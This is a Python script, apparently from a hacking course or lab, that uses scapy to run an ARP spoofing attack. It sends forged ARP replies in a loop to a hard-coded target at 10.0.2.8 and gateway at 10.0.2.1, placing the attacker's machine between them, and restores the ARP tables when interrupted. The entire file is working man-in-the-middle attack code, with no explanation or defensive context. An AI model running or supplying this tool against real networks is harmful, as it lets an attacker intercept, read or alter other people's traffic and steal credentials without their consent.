#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_r_b = broadcast/arp_request
    answered_list = scapy.srp(arp_r_b, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

packets_count = 0

t_ip = "10.0.2.8"
gw_ip = "10.0.2.1"
try:
    while True:
        spoof(t_ip, gw_ip)
        spoof(gw_ip, t_ip)
        packets_count = packets_count + 2
        print("\r[+] Packets Sent: " + str(packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    restore(t_ip, gw_ip)
    restore(gw_ip, t_ip)
    print("Quitting Program")